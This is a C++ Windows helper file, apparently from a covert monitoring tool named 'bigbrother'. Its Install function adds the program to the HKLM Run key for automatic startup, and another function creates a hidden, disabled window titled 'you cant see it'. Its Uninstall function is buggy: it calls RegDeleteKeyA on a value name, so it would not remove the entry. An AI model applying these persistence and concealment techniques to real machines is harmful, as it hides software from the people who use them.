#include <sstream>
#include "winapihelpers.h"

namespace winapi
{
    int Install()
    {
        char fileName[256];
        if (!GetModuleFileNameA(NULL, fileName, sizeof(fileName)))
            return -1;

        HKEY hKey;
        std::string fullPath{ fileName };
        LSTATUS result = RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            KEY_WRITE,
            &hKey);

        if (result == ERROR_SUCCESS)
        {
            result = RegSetValueExA(
                hKey,
                "bigbrother",
                0,
                REG_SZ,
                (unsigned char*)fullPath.c_str(),
                fullPath.size()
            );
        }
        return 0;
    }

    int Uninstall()
    {
        HKEY hKey;
        LSTATUS result = RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            DELETE,
            &hKey);

        if (result == ERROR_SUCCESS)
        {
            LSTATUS result = RegDeleteKeyA(
                hKey,
                "bigbrother"
            );
        }
        return 0;
    }

    std::string ModuleFileName()
    {
        char buffer[256];
        GetModuleFileNameA(NULL, buffer, sizeof(buffer));
        return buffer;
    }

    std::string CurrentDirectory()
    {
        char buffer[256];
        GetCurrentDirectoryA(sizeof(buffer), buffer);
        return buffer;
    }

    std::string ModuleFileDirectory()
    {
        std::string moduleFileName{ std::move(ModuleFileName()) };
        std::stringstream wordStream;
        std::stringstream resultStream;
        for (auto i = moduleFileName.begin(); i != moduleFileName.end(); i++)
        {
            wordStream << *i;
            if (*i == '\\')
            {
                resultStream << wordStream.str();
                wordStream.str(std::string());
            }
        }
        return resultStream.str();
    }

    void MsgBox(std::string title, std::string text)
    {
        ::MessageBoxA(NULL, text.c_str(), title.c_str(), MB_OK);
    }

    HWND CreateInvisibleWindow(HINSTANCE hInstance, std::string className, WNDPROC wndproc)
    {
        WNDCLASSEXA wcex
        {
            sizeof(WNDCLASSEXA),
            WS_EX_NOACTIVATE,
            wndproc,
            0,
            0,
            hInstance,
            nullptr,
            nullptr,
            nullptr,
            nullptr,
            className.c_str(),
            nullptr
        };

        if (!RegisterClassExA(&wcex))
            return NULL;

        HWND hWnd = CreateWindowExA(
            WS_EX_NOACTIVATE,
            className.c_str(),
            "you cant see it",
            WS_DISABLED,
            0,
            0,
            1,
            1,
            nullptr,
            nullptr,
            hInstance,
            nullptr);

        if (!hWnd)
            return 0;

        ShowWindow(hWnd, SW_HIDE);

        return hWnd;
    }
}